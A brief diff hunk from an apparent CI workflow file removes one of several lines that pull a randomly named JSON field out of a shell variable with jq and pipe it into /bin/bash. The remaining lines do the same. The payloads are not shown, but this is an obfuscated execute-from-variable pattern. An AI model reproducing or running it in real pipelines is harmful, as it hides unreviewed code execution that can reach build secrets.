@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$z72" | jq -r .vfpk5948 | /bin/bash
           echo $hqtpt0 | jq -r .wjk883 | /bin/bash
           echo $raldt9098 | jq -r .ndryh050 | /bin/bash
-          echo $q440 | jq -r .fvh29463 | /bin/bash
           echo $xef4784 | jq -r .dimec334 | /bin/bash
 
       - name: Upload results
